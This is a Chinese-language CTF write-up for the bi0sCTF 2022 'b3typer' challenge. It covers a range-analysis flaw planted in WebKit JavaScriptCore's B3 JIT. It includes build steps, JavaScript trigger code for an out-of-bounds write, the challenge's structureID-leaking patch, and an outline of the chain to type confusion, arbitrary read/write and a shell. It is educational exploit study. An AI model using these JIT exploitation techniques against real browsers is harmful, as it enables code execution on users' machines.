---
title: b3typer - bi0sCTF 2022
contest: bi0sCTF 2022
year: 2022
difficulty: hard
vuln_type: [pwn_unknown, reverse]
tags: [WebKit, JSC, JavaScriptCore, B3, JIT, range-analysis, integer-underflow, OOB-write, butterfly, structID]
attack_chain: ["编译 debug 模式 WebKit JSC", "分析 rangeForMask 偏差 [0,2] vs [1,2]", "触发 c & 2 = 0 → 整数下溢到 -1", "编译器假定 idx ≥ 0 跳过减法范围检查", "覆盖 butterfly 后续数组 length=0x1337 OOB 读写", "暴露 structureID bits → 类型混淆 + 任意 r/w"]
key_payload: "let c = b & 2; let idx = c - 1; if (idx < 1) { idx += -0x80000000; }"
one_liner: WebKit B3 rangeForMask 偏差 + 整数下溢消除边界检查
lesson: JIT range analysis 若起点假定偏移，实际 0 也可触发下溢消除上界检查；patch Reflect.strid 暴露 structureID 即可类型混淆
quality: high
---

# b3typer - bi0sCTF 2022

原文 https://www.ctfiot.com/92870.html

## 漏洞链
**Step 1: 编译 debug WebKit**
```bash
git clone https://github.com/WebKit/WebKit.git
cd WebKit && git checkout 645b9044d2369e3b083b171da517a2440bb4fa18
git apply debug.patch
Tools/gtk/install-dependencies
Tools/Scripts/build-webkit --jsc-only --debug
```

**Step 2: B3 `rangeForMask` 偏差**
原代码假定 `b & 2` 结果范围 `[0, 2]`，但题目改成 `IntRange(1, 2)`（实际是 0,1,2），当 c=0 时执行 `c-1` 触发 -1。

**Step 3: 整数下溢 → 消除上界检查**
```js
let b = a | 0;        // int32
let c = b & 2;        // 假定 [1,2]，实际 [0,2]
let idx = c - 1;      // 假定 [0,1]，实际 [-1,1]
if (idx < arr.length) { // 永远过
    if (idx < 1) {
        idx += -0x80000000;  // -1 → 0x7FFFFFFF
    }
    if (idx > 0) {
        arr[idx] = 0x1337;   // OOB 写
    }
}
```
B3 把 `c-1` 优化成 `CheckAdd` 假定非负，**idx=0x7FFFFFFF 通过所有 if 检查后无下界检查**，arr 长度覆盖成 0x1337。

**Step 4: 任意 R/W**
- 改写 butterfly 后方 array 的 length → OOB read/write
- 题目 patch 增加 `Reflect.strid(obj)` 暴露 structureID bits → 拿 fake structureID → 类型混淆（float array 解释为 object array）
- 标准 JIT pwn 链：oob r/w → 信息泄露 → shellcode / wasm rwx → shell

## 关键 patch
```cpp
JSC_DEFINE_HOST_FUNCTION(reflectObjectStrid, (JSGlobalObject* globalObject, CallFrame* callFrame)) {
    JSValue target = callFrame->argument(0);
    if (!target.isObject())
        return JSValue::encode(throwTypeError(...));
    JSObject* targetObject = asObject(target);
    RELEASE_AND_RETURN(scope, JSValue::encode(jsNumber(targetObject->structureID().bits())));
}
```

## 教学要点
- JIT range analysis 偏差是 JS 引擎 pwn 主流
- B3 IR `reduceValueStrength` 对 CheckAdd → Add 优化
- `rangeForMask` 是 WebKit B3 整数范围分析核心
- structureID 暴露 → butterfly 类型混淆 → 任意读写
- 调试 build 不开 ASLR，ASLR 部署需 leak
